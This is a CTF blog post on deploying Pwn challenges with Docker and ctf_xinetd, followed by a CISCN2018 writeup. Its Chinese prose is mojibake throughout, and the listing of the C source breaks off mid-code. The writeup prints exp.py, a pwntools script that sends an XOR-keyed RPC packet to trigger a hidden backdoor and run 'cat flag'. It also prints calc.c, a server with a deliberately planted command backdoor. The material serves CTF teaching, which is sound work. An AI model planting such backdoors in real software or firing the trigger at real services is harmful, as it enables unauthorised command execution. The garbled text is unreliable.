        <content type="html"><![CDATA[<p>â€¦â€¦</p><a id="more"></a><h1 id="ä½¿ç”¨Dockerè¿›è¡ŒPwné¢˜ç¯å¢ƒéƒ¨ç½²"><a href="#ä½¿ç”¨Dockerè¿›è¡ŒPwné¢˜ç¯å¢ƒéƒ¨ç½²" class="headerlink" title="ä½¿ç”¨Dockerè¿›è¡ŒPwné¢˜ç¯å¢ƒéƒ¨ç½²"></a>ä½¿ç”¨Dockerè¿›è¡ŒPwné¢˜ç¯å¢ƒéƒ¨ç½²</h1><blockquote><p>ğŸ˜„dockeræ˜¯ä¸ªå¥½ä¸œè¥¿ï¼Œåœ¨CTFæ¯”èµ›ä¸­æˆ‘ä»¬å¯ä»¥ç»å¸¸é‡åˆ°é€šè¿‡dockeréƒ¨ç½²çš„webï¼Œæˆ–è€…Pwnç¯å¢ƒï¼ŒåŒæ ·æˆ‘ä»¬ä¹Ÿå¯ä»¥å°†ä¸€äº›æœåŠ¡éƒ¨ç½²åœ¨dockeré‡Œé¢ï¼Œç®¡ç†æ–¹ä¾¿ï¼Œå¹¶ä¸”è¾ƒä¸ºå®‰å…¨ã€‚</p><p>é€šè¿‡dockeræˆ‘ä»¬å¯ä»¥è‡ªå·±åˆ›å»ºé•œåƒï¼Œæˆ–è€…æ‹‰å–é•œåƒï¼Œæ¯”å¦‚è¯´<a href="http://vulapps.evalbug.com/" target="_blank" rel="noopener">vulapps</a>ä¸Šé¢çš„é¶æœºï¼Œè¿˜æœ‰è¿™æ¬¡è¦è®²çš„ç®€å•çš„Pwnç¯å¢ƒéƒ¨ç½²æ¡†æ¶ã€‚</p><p>è¿™é‡Œæœ‰Angel_kittyå¸ˆå‚…å†™çš„ä¸€ä»½è¶…è¯¦ç»†dockeræ•™ç¨‹ã€‚<a href="https://www.cnblogs.com/ECJTUACM-873284962/p/9789130.html" target="_blank" rel="noopener">ä¼ é€é—¨</a></p></blockquote><h2 id="Docker-å®‰è£…"><a href="#Docker-å®‰è£…" class="headerlink" title="Docker å®‰è£…"></a>Docker å®‰è£…</h2><h3 id="1-aptå®‰è£…"><a href="#1-aptå®‰è£…" class="headerlink" title="1.aptå®‰è£…"></a>1.aptå®‰è£…</h3><pre class=" language-bash"><code class="language-bash"><span class="token function">apt-get</span> <span class="token function">install</span> docker docker-compose</code></pre><h3 id="2-æ‰‹åŠ¨ä¸‹è½½å¹¶ä¸”å®‰è£…"><a href="#2-æ‰‹åŠ¨ä¸‹è½½å¹¶ä¸”å®‰è£…" class="headerlink" title="2.æ‰‹åŠ¨ä¸‹è½½å¹¶ä¸”å®‰è£…"></a>2.æ‰‹åŠ¨ä¸‹è½½å¹¶ä¸”å®‰è£…</h3><p><a href="https://download.docker.com/linux/debian/dists/" target="_blank" rel="noopener">ä¸‹è½½é“¾æ¥</a></p><p>ä¸‹è½½å®Œæˆåè¿›å…¥å®‰è£…æŠ¥æ‰€åœ¨çš„ç›®å½•ï¼Œå¹¶ä¸”æ‰§è¡Œä¸€ä¸‹å‘½ä»¤è¿›è¡Œå®‰è£…ï¼š</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#dbkg -i filename</span>dpkg -i docker-ce_17.03.1~ce-0~debian-jessie_amd64.deb</code></pre><h3 id="3-åˆ‡æ¢é•œåƒæº"><a href="#3-åˆ‡æ¢é•œåƒæº" class="headerlink" title="3.åˆ‡æ¢é•œåƒæº"></a>3.åˆ‡æ¢é•œåƒæº</h3><p>vim /etc/docker/daemon.json</p><pre class=" language-shell"><code class="language-shell">cat > /etc/docker/daemon.json << EOF{  "registry-mirrors": ["https://docker.mirrors.ustc.edu.cn"]}EOFservice docker restart</code></pre><h2 id="Docker-ç®€å•ä½¿ç”¨"><a href="#Docker-ç®€å•ä½¿ç”¨" class="headerlink" title="Docker ç®€å•ä½¿ç”¨"></a>Docker ç®€å•ä½¿ç”¨</h2><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ä»¥ä¸‹å‡ æ¡å‘½ä»¤ç®€å•æµ‹è¯•ä¸€ä¸‹dockeræ˜¯å¦å®‰è£…æˆåŠŸï¼š</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#å¯åŠ¨docker</span><span class="token function">service</span> docker startdocker images<span class="token comment" spellcheck="true">#hello-worldä¸ºå…¶è‡ªå¸¦çš„ä¸€ä¸ªimage</span>docker run hello-world</code></pre><p>ä»¥åŠä¸€äº›å¸¸ç”¨çš„å‘½ä»¤ï¼Œå¯ä»¥è®°å½•ä¸€ä¸‹ï¼š</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#æŸ¥çœ‹æœ¬åœ°å·²æœ‰é•œåƒ</span>docker images<span class="token comment" spellcheck="true">#è¿è¡Œé•œåƒå¹¶è¿›å…¥</span>docker run -i -t httpd /bin/bash<span class="token comment" spellcheck="true">#åå°è¿è¡Œé•œåƒï¼Œé•œåƒ8080ç«¯å£æ˜ å°„åˆ°ä¸»æœº80ç«¯å£</span>docker run -d -p 80:8080 httpd<span class="token comment" spellcheck="true">#è¿›å…¥å·²æœ‰å®¹å™¨</span>docker <span class="token function">exec</span> -it <span class="token punctuation">[</span>container-id<span class="token punctuation">]</span> /bin/bash<span class="token comment" spellcheck="true">#å…³é—­é•œåƒ</span>docker stop httpd<span class="token comment" spellcheck="true">#æŸ¥çœ‹å½“å‰æ­£åœ¨è¿è¡Œçš„é•œåƒ</span>docker <span class="token function">ps</span>ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€</code></pre><h1 id="Pwnéƒ¨ç½²æ¡†æ¶"><a href="#Pwnéƒ¨ç½²æ¡†æ¶" class="headerlink" title="Pwnéƒ¨ç½²æ¡†æ¶"></a>Pwnéƒ¨ç½²æ¡†æ¶</h1><blockquote><p>é€šè¿‡æ¡†æ¶æˆ‘ä»¬å¯ä»¥å¿«é€Ÿåœ°éƒ¨ç½²Pwné¢˜ç¯å¢ƒï¼Œè€Œä¸ç”¨æ“å¤ªå¤šçš„å¿ƒğŸ’—ã€‚</p></blockquote><h2 id="ctf-xinetd"><a href="#ctf-xinetd" class="headerlink" title="ctf_xinetd"></a>ctf_xinetd</h2><p>æˆ‘ä»¬å¯ä»¥ä»githubä¸Šä¸‹è½½åˆ°<a href="https://github.com/Eadom/ctf_xinetd" target="_blank" rel="noopener">ctf_xinetd</a> ï¼Œå®ƒæ˜¯å¼€æºçš„ä¸€ä¸ªé¡¹ç›®ã€‚</p><blockquote><p>#README.md</p><blockquote><p>A docker repository for deploying CTF challenges</p></blockquote><h2 id="Configuration"><a href="#Configuration" class="headerlink" title="Configuration"></a>Configuration</h2><p>Put files to floder <code>bin</code>. Theyâ€™ll be copied to /home/ctf. <strong>Update the flag</strong> at the same time.</p><p>Edit <code>ctf.xinetd</code>. replace <code>./helloworld</code> to your command.</p><p>You can also edit <code>Dockerfile, ctf.xinetd, start.sh</code> to custom your environment.</p><h2 id="Build"><a href="#Build" class="headerlink" title="Build"></a>Build</h2><pre class=" language-bash"><code class="language-bash">docker build -t <span class="token string">"helloworld"</span> <span class="token keyword">.</span></code></pre><p>DO NOT use <em>bin</em> as challengeâ€™s name</p><h2 id="Run"><a href="#Run" class="headerlink" title="Run"></a>Run</h2><pre class=" language-bash"><code class="language-bash">docker run -d -p <span class="token string">"0.0.0.0:pub_port:9999"</span> -h <span class="token string">"helloworld"</span> --name<span class="token operator">=</span><span class="token string">"helloworld"</span> helloworld</code></pre><p><code>pub_port</code> is the port you want to expose to the public network.</p><h2 id="Capture-traffic"><a href="#Capture-traffic" class="headerlink" title="Capture traffic"></a>Capture traffic</h2><p>If you want to capture challenge traffic, just run <code>tcpdump</code> on the host. Here is an example.</p><pre class=" language-bash"><code class="language-bash">tcpdump -w helloworld.pcap -i eth0 port pub_port</code></pre></blockquote><p>å…ˆç®€å•åœ°çœ‹ä¸€ä¸‹å®ƒçš„ç›®å½•ç»“æ„ï¼š</p><p><img src="https://i.loli.net/2018/10/30/5bd87b591ea60.png" alt=""></p><p>é¦–å…ˆå°†é¡¹ç›®ä¸‹è½½åˆ°æœ¬åœ°ï¼Œå¹¶ä¸”å°†å‡†å¤‡å¥½çš„pwné¢˜å’Œflagæ”¾å…¥binæ–‡ä»¶å¤¹ä¸­ã€‚<br><img src="https://i.loli.net/2018/10/30/5bd87ba1360b7.png" alt=""></p><p>ç„¶åæˆ‘ä»¬å»ä¿®æ”¹ctf.xinetdæ–‡ä»¶ä¸­çš„é…ç½®å‚æ•°ï¼š</p><p><img src="https://i.loli.net/2018/10/30/5bd87bda03b20.png" alt=""></p><p>ç„¶åæ ¹æ®readmeæ–‡æ¡£æˆ‘ä»¬å¯ä»¥è¿›è¡Œdockerå®¹å™¨çš„å»ºç«‹ï¼Œè¿è¡Œï¼Œä¹ƒè‡³æµé‡çš„ç›‘å¬ã€‚</p><h1 id="å›½èµ›Pwnä¹‹ä¸€"><a href="#å›½èµ›Pwnä¹‹ä¸€" class="headerlink" title="å›½èµ›Pwnä¹‹ä¸€"></a>å›½èµ›Pwnä¹‹ä¸€</h1><blockquote><p>è¿˜è®°å¾—ä»Šå¹´å›½èµ›æ˜¯è®©å„æ”¯è¿›äº†åŠå†³èµ›çš„é˜Ÿä¼è¿›è¡Œå‡ºé¢˜ï¼Œé¶æ ‡è®¾ç½®ï¼Œè¿™ä¸ªç¯èŠ‚è¢«ç§°ä½œ<code>Built it</code>ï¼Œä½†æ˜¯æˆ‘ä»¬å¤ªèœäº†ï¼Œæ²¡æœ‰å‡ºé¢˜ï¼Œä¹Ÿæ²¡æœ‰å‚åŠ çš„é‚£ä¸ªå®åŠ›ï¼ŒPS:æˆ‘ä¼šè¯´æˆ‘è¿<a href="https://github.com/sherlly/ciscn2018-pwn/tree/master/checker" target="_blank" rel="noopener">checker</a>éƒ½æ²¡çœ‹æ‡‚å—ï¼Œæ›´åˆ«è¯´è¿‡checkeräº†ã€‚</p><p>é™„ä¸ŠXp0inté˜Ÿä¼å›½èµ›å‡ºçš„é¢˜è§£ï¼Œä»¥åŠPwnç¯å¢ƒï¼Œå€Ÿä»¥å‚è€ƒã€‚</p></blockquote><blockquote><p>#WP</p><h2 id="CISCN2018-May-be-a-calculator"><a href="#CISCN2018-May-be-a-calculator" class="headerlink" title="CISCN2018 : May be a calculator?"></a>CISCN2018 : May be a calculator?</h2><h2 id="Principle"><a href="#Principle" class="headerlink" title="[Principle]"></a><strong>[Principle]</strong></h2><p>backdoor</p><h2 id="Environment"><a href="#Environment" class="headerlink" title="[Environment]"></a><strong>[Environment]</strong></h2><p>Ubuntu</p><h2 id="Tools"><a href="#Tools" class="headerlink" title="[Tools]"></a><strong>[Tools]</strong></h2><p>gdbã€objdumpã€pythonã€pwntools</p><h2 id="Process"><a href="#Process" class="headerlink" title="[Process]"></a><strong>[Process]</strong></h2><p>è€ƒå¯ŸRPCç›¸å…³åè®®åŠé¢„ç•™åé—¨ï¼Œé€šè¿‡é€†å‘ä»£ç é€»è¾‘å¯ä»¥çœ‹åˆ°åœ¨ç¬¦åˆtypeä¸º0x6æ—¶ï¼Œéšè—äº†ä¸€ä¸ªåé—¨ï¼Œåœ¨åé—¨å‡½æ•°ä¸­é¦–å…ˆå¯¹æ¥æ”¶åˆ°çš„keyè¿›è¡Œæ£€æŸ¥ï¼Œé€šè¿‡å°†åŠ å¯†åçš„keyï¼ˆåŠ å¯†ç®—æ³•ä¸ºç®€å•çš„å¼‚æˆ–ï¼‰å’Œä¸€ä¸ªå›ºå®šå­—ç¬¦ä¸²è¿›è¡Œæ¯”è¾ƒï¼Œç›¸ç­‰åˆ™æ¥æ”¶çœŸæ­£çš„payloadï¼ŒåŠ å¯†ç®—æ³•å¦‚ä¸‹ï¼š</p><pre><code>void encrypt(char* key){  int i;  int k=0;  for(i=0;i&lt;36;i++)  {    key[i]=(key[i]^k)%256;    k+=23;  }}</code></pre><p>æœ€ç»ˆè„šæœ¬å¦‚ä¸‹ï¼š<br>exp.py</p><pre><code>from pwn import *import ospayload=&quot;cat flag&quot;key=&quot;12345678-6666-2333-5555-deadbeef1234&quot;backdoor=b&#39;RPCM\x00\x00\x00\x0c\x00\x00\x00\x06&#39;+p32(len(key))[::-1]+key+p32(len(payload))[::-1]+payloadr = remote(&#39;127.0.0.1&#39;, 1337)r.sendline(backdoor)print r.recvline()r.close()</code></pre></blockquote><p>calc.cç¨‹åºä»£ç å¦‚ä¸‹ï¼š</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/socket.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;netdb.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdbool.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;uuid/uuid.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;netinet/in.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;arpa/inet.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/shm.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;queue></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;map></span></span><span class="token macro property">#<span class="token directive keyword">define</span> BUF_SIZE 0x100</span><span class="token macro property">#<span class="token directive keyword">define</span> LENGTH 100</span>using namespace std<span class="token punctuation">;</span><span class="token keyword">typedef</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> byte<span class="token punctuation">;</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> top<span class="token punctuation">;</span>    <span class="token keyword">long</span> <span class="token keyword">long</span> pool<span class="token punctuation">[</span>LENGTH<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span> stack<span class="token punctuation">;</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> Data<span class="token punctuation">{</span>  string corr_id<span class="token punctuation">;</span>  string res<span class="token punctuation">;</span><span class="token punctuation">}</span> Data<span class="token punctuation">;</span><span class="token keyword">typedef</span> queue<span class="token operator">&lt;</span>Data<span class="token operator">></span> Q<span class="token punctuation">;</span><span class="token keyword">typedef</span> map<span class="token operator">&lt;</span>string<span class="token punctuation">,</span>Q<span class="token operator">></span> MQ<span class="token punctuation">;</span>map<span class="token operator">&lt;</span>string<span class="token punctuation">,</span>Q<span class="token operator">></span><span class="token punctuation">:</span><span class="token punctuation">:</span>iterator it_find<span class="token punctuation">;</span>byte RECV_MAGIC<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'R'</span><span class="token punctuation">,</span><span class="token string">'P'</span><span class="token punctuation">,</span><span class="token string">'C'</span><span class="token punctuation">,</span><span class="token string">'M'</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">char</span><span class="token operator">*</span> EVIL_INS<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"1%\x1dqiE\xbd\x99\x95\xf9\xd0\xcb\"\x06pjC\xb4\xb3\x80\xf9\xd6\xcf&lt;LZ7\t\xe6\xfe\xd7\xaf\xd1\xc5=\x11"</span><span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span> <span class="token function">p32</span><span class="token punctuation">(</span><span class="token keyword">int</span> value<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span> result<span class="token punctuation">;</span>  result <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  result<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>byte<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>value <span class="token operator">>></span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  result<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>byte<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>value <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  result<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>byte<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>value <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  result<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>byte<span class="token punctuation">)</span><span class="token punctuation">(</span>value <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">char</span><span class="token operator">*</span> <span class="token function">StrTrim</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> pStr<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> <span class="token operator">*</span>pTmp <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span>pStr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>pTmp<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>pStr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> mark <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span>pStr<span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>pStr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">' '</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            pTmp<span class="token punctuation">[</span>mark<span class="token punctuation">]</span> <span class="token operator">=</span> pStr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            mark<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    pTmp<span class="token punctuation">[</span>mark<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'\x00'</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> pTmp<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">myatoi</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> buf<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">*</span>buf<span class="token punctuation">)</span> <span class="token punctuation">{</span>        sum <span class="token operator">=</span> sum <span class="token operator">*</span> <span class="token number">10</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token operator">*</span>buf <span class="token operator">-</span> <span class="token string">'0'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        buf<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> sum<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">read_str</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> buf<span class="token punctuation">,</span> <span class="token keyword">int</span> n<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> t <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> n<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>buf<span class="token punctuation">[</span>t <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'\n'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        buf<span class="token punctuation">[</span>t <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'\x00'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    buf<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'\x00'</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> t<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">input_pass</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> buf<span class="token punctuation">,</span> <span class="token keyword">int</span> size<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> ret <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> size<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">char</span> c <span class="token operator">=</span> buf<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token punctuation">(</span>c <span class="token operator">>=</span> <span class="token string">'0'</span> <span class="token operator">&amp;&amp;</span> c <span class="token operator">&lt;=</span> <span class="token string">'9'</span><span class="token punctuation">)</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'+'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'-'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'*'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'/'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'\x00'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'('</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">')'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            ret <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> size<span class="token number">-1</span><span class="token punctuation">;</span> i<span class="token operator">=</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">char</span> c1 <span class="token operator">=</span> buf<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">char</span> c2 <span class="token operator">=</span> buf<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>c1 <span class="token operator">==</span> <span class="token string">'+'</span> <span class="token operator">||</span> c1 <span class="token operator">==</span> <span class="token string">'-'</span> <span class="token operator">||</span> c1 <span class="token operator">==</span> <span class="token string">'*'</span> <span class="token operator">||</span> c1 <span class="token operator">==</span> <span class="token string">'/'</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>c2 <span class="token operator">>=</span> <span class="token string">'0'</span> <span class="token operator">&amp;&amp;</span> c2 <span class="token operator">&lt;=</span> <span class="token string">'9'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            ret <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>c2 <span class="token operator">==</span> <span class="token string">'+'</span> <span class="token operator">||</span> c2 <span class="token operator">==</span> <span class="token string">'-'</span> <span class="token operator">||</span> c2 <span class="token operator">==</span> <span class="token string">'*'</span> <span class="token operator">||</span> c2 <span class="token operator">==</span> <span class="token string">'/'</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>c1 <span class="token operator">>=</span> <span class="token string">'0'</span> <span class="token operator">&amp;&amp;</span> c1 <span class="token operator">&lt;=</span> <span class="token string">'9'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            ret <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> ret<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">push</span><span class="token punctuation">(</span>stack<span class="token operator">*</span> s<span class="token punctuation">,</span> <span class="token keyword">int</span> value<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>s<span class="token operator">-></span>top <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        s<span class="token operator">-></span>top<span class="token operator">--</span><span class="token punctuation">;</span>        s<span class="token operator">-></span>pool<span class="token punctuation">[</span>s<span class="token operator">-></span>top<span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">priority</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> ret<span class="token punctuation">;</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">case</span> <span class="token string">'('</span><span class="token punctuation">:</span>            ret <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'*'</span><span class="token punctuation">:</span>        <span class="token keyword">case</span> <span class="token string">'/'</span><span class="token punctuation">:</span>            ret <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'+'</span><span class="token punctuation">:</span>        <span class="token keyword">case</span> <span class="token string">'-'</span><span class="token punctuation">:</span>            ret <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">')'</span><span class="token punctuation">:</span>            ret<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token number">0</span><span class="token punctuation">:</span>            ret <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>            ret <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span 